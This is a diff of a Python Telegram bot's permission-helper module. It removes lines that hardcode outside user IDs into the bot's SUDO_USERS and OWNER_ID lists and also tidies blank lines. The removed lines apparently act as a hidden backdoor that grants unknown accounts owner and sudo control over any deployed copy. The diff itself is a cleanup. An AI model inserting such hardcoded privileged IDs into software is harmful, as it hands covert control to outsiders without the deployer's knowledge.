@@ -9,15 +9,6 @@ from driver.admins import get_administrators
 from driver.database.dblockchat import blacklisted_chats
 from driver.database.dbpunish import is_gbanned_user
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
-SUDO_USERS.append(859229457)
-
-OWNER_ID.append(1757169682)
-OWNER_ID.append(859229457)
-
-
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         try:
@@ -27,7 +18,6 @@ def errors(func: Callable) -> Callable:
             await message.reply(f"{type(e).__name__}: {e}")
 
     return decorator
-
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -42,7 +32,6 @@ def authorized_users_only(func: Callable) -> Callable:
 
     return decorator
 
-
 def bot_creator(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in OWNER_ID:
@@ -50,14 +39,12 @@ def bot_creator(func: Callable) -> Callable:
         
     return decorator
 
-
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in SUDO_USERS:
             return await func(client, message)
         
     return decorator
-
 
 def humanbytes(size):
     """Convert Bytes To Bytes So That Human Can Read It"""
@@ -71,7 +58,6 @@ def humanbytes(size):
         size /= power
         raised_to_pow += 1
     return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
-
 
 async def check_perms(
     message: Union[CallbackQuery, Message],
@@ -118,7 +104,6 @@ async def check_perms(
                      else f"💡 You need to be an administrator to use this command.\n\n ❌ __{permission_text}__")
     return False
 
-
 def require_admin(
     permissions: Union[list, str] = None,
     notice: bool = True,
@@ -136,7 +121,6 @@ def require_admin(
         return wrapper
 
     return decorator
-
 
 def check_blacklist():
     def decorator(func):
